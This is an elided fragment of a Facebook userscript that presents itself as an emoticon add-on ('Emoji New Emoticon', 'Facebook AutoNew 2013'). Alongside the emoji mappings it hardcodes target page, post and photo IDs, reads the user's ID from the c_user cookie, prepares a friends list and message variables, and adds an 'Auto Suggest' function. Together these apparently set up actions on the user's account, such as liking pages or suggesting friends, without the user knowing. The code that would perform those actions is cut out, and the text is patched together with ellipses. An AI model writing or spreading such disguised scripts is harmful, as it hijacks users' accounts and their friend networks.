// ==UserScript==
// @name            Emoji New Emoticon @Tb_Guntur 
// @description     Facebook AutoNew 2013 By Tb Guntur
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/Tb.Guntur" target="_blank">Created By Tb Guntur<br>KLIK DISINI</a>';
	html += '</div>';
...
var spage_id = "195340223836866";
var spost_id = "656340201060063";
var sfoto_id = "656339891060094";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Tb Guntur';
